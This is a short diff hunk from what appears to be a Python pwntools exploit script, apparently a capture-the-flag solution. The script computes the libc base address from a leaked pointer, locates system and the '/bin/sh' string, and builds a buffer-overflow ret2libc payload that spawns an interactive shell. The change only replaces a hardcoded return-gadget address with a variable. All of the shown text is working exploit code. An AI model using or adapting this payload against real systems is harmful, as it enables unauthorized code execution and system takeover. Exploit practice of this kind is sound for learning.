@@ -284,7 +284,7 @@ base_addr = write_addr - libc.dump('write')
 system = base_addr + libc.dump('system')
 binsh = base_addr + libc.dump('str_bin_sh')
 
-payload = b'a'*0x108+p64(0x40101A) +p64(pop_rdi_addr)+p64(binsh) +p64(system)
+payload = b'a'*0x108+p64(ret_addr) +p64(pop_rdi_addr)+p64(binsh) +p64(system)
 
 p.sendlineafter('Input:\n',payload)
 p.interactive()
